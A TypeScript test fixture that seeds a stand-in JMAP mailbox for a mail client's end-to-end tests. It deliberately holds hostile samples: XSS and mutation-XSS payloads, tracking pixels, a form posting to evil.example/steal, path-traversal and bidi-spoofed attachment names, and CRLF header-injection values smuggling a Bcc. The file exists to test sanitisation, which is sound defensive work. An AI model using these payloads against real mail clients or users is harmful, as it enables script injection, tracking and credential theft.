/**
 * The mailbox the stand-in JMAP serves: the folders and the messages in them,
 * hostile ones included. Each hostile message is a real payload of a kind that
 * has run script, tracked a reader or confused one in some mail client, so the
 * end-to-end checks read the panel's answer to it and not to a polite sample.
 */

export interface Addr {
	name: string | null;
	email: string;
}

export interface SeedAttachment {
	name: string;
	type: string;
	content: string;
	disposition?: "attachment" | "inline";
}

export interface SeedMessage {
	id: string;
	mailbox: string;
	receivedAt: string;
	subject: string;
	from: Addr[];
	to: Addr[];
	cc?: Addr[];
	keywords: Record<string, boolean>;
	text?: string;
	html?: string;
	attachments?: SeedAttachment[];
}

/** The mailboxes, in the shape `Mailbox/get` lists them. */
export const MAILBOXES = [
	{ id: "INBOX", name: "INBOX", parentId: null, role: "inbox" },
	{ id: "Drafts", name: "Drafts", parentId: null, role: "drafts" },
	{ id: "Sent", name: "Sent", parentId: null, role: "sent" },
	{ id: "Archive", name: "Archive", parentId: null, role: "archive" },
	{ id: "Junk", name: "Junk", parentId: null, role: "junk" },
	{ id: "Trash", name: "Trash", parentId: null, role: "trash" },
	{ id: "Work", name: "Work", parentId: null, role: null },
	{ id: "Work/Q4", name: "Q4", parentId: "Work", role: null },
] as const;

/** A UUID the stand-in gives to its n-th seeded message. */
export function seedId(n: number): string {
	return `00000000-0000-4000-8000-${n.toString(16).padStart(12, "0")}`;
}

const ME: Addr = { name: null, email: "admin@example.test" };
const ANA: Addr = { name: "Ana Pérez", email: "ana@example.org" };

/** Named ids, so a scenario can open each message. */
export const IDS = {
	welcome: seedId(1),
	newsletter: seedId(2),
	hostileHtml: seedId(3),
	hostileHeaders: seedId(4),
	attachments: seedId(5),
	mxss: seedId(6),
	textOnly: seedId(7),
	flagged: seedId(8),
	archived: seedId(9),
} as const;

/** Every attachment name and type below tries to be run, or to be a path, when it is saved. */
const ATTACHMENTS: SeedAttachment[] = [
	{ name: "report.pdf", type: "application/pdf", content: "%PDF-1.4 stand-in" },
	{
		name: "../../etc/cron.d/evil‮gpj.exe",
		type: "text/html",
		content: "<script>alert('attachment')</script>",
	},
	{
		name: "logo.svg",
		type: "image/svg+xml",
		content: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
	},
];

const HOSTILE_HTML = [
	"<p>Hello</p>",
	"<script>document.title='pwned-script'</script>",
	'<svg onload="document.title=\'pwned-svg\'"><circle r="5"/></svg>',
	'<div style="background:url(https://tracker.example/css.gif)">styled</div>',
	"<style>body{background:url(https://tracker.example/style.gif)}</style>",
	'<meta http-equiv="refresh" content="0;url=https://evil.example/">',
	'<base href="https://evil.example/">',
	'<a href="javascript:document.title=\'pwned-link\'">js link</a>',
	'<a href="https://example.org/ok">safe link</a>',
	'<img src="https://tracker.example/pixel.gif" alt="remote picture" onerror="document.title=\'pwned-img\'">',
	'<iframe src="https://evil.example/"></iframe>',
	'<form action="https://evil.example/steal"><input name="pw"></form>',
	"<p onclick=\"document.title='pwned-click'\">click me</p>",
].join("\n");

const MXSS_HTML = [
	'<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
	'<noscript><p title="</noscript><img src=x onerror=alert(2)>">',
	"<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(3)>",
].join("\n");

/** The messages the mailbox holds at the start. */
export function seedMessages(): SeedMessage[] {
	const messages: SeedMessage[] = [
		{
			id: IDS.welcome,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T09:00:00Z",
			subject: "Welcome to your mailbox",
			from: [ANA],
			to: [ME],
			keywords: {},
			text: "Hello,\n\nThis is the first message.\n\nAna",
		},
		{
			id: IDS.newsletter,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T08:30:00Z",
			subject: "Weekly newsletter",
			from: [{ name: "News Bot", email: "news@example.org" }],
			to: [ME],
			keywords: { $seen: true },
			text: "Newsletter, plain version.",
			html: '<h1>Weekly newsletter</h1><p>Read <a href="https://example.org/news">the news</a>.</p><img src="https://tracker.example/open.gif?u=1" alt="header"><img src="https://tracker.example/second.gif">',
		},
		{
			id: IDS.hostileHtml,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T08:00:00Z",
			subject: "Hostile HTML body",
			from: [{ name: "Mallory", email: "mallory@example.org" }],
			to: [ME],
			keywords: {},
			html: HOSTILE_HTML,
		},
		{
			id: IDS.hostileHeaders,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T07:30:00Z",
			subject: "Invoice‮txt.exe\r\nBcc: attacker@example.org",
			from: [{ name: "Boss‮⁦ <ceo@example.org>", email: "mallory@example.org" }],
			to: [ME],
			cc: [{ name: "a\r\nX-Injected: yes", email: "cc@example.org" }],
			keywords: { $flagged: true },
			text: "Headers with line breaks and bidi controls.",
		},
		{
			id: IDS.attachments,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T07:00:00Z",
			subject: "Files you asked for",
			from: [ANA],
			to: [ME],
			keywords: {},
			text: "See the attachments.",
			attachments: ATTACHMENTS,
		},
		{
			id: IDS.mxss,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T06:30:00Z",
			subject: "Mutation payloads",
			from: [{ name: "Mallory", email: "mallory@example.org" }],
			to: [ME],
			keywords: {},
			html: MXSS_HTML,
		},
		{
			id: IDS.textOnly,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T06:00:00Z",
			subject: "Markup in plain text",
			from: [ANA],
			to: [ME],
			keywords: { $seen: true },
			text: "<script>alert('text')</script> and <b>not bold</b>",
		},
		{
			id: IDS.flagged,
			mailbox: "INBOX",
			receivedAt: "2026-11-11T12:00:00Z",
			subject: "Starred and answered",
			from: [ANA],
			to: [ME],
			keywords: { $flagged: true, $answered: true, $seen: true },
			text: "Remember this one.",
		},
		{
			id: IDS.archived,
			mailbox: "Archive",
			receivedAt: "2026-10-01T12:00:00Z",
			subject: "Old thread",
			from: [ANA],
			to: [ME],
			keywords: { $seen: true },
			text: "Archived.",
		},
	];
	for (let n = 0; n < 60; n++) {
		messages.push({
			id: seedId(100 + n),
			mailbox: "INBOX",
			receivedAt: new Date(Date.UTC(2026, 10, 10, 12, 0) - n * 3_600_000).toISOString().replace(".000Z", "Z"),
			subject: `Bulk message ${n + 1}`,
			from: [{ name: `Sender ${n + 1}`, email: `sender${n + 1}@example.org` }],
			to: [ME],
			keywords: n % 3 === 0 ? {} : { $seen: true },
			text: `Body of bulk message ${n + 1}.`,
		});
	}
	return messages;
}
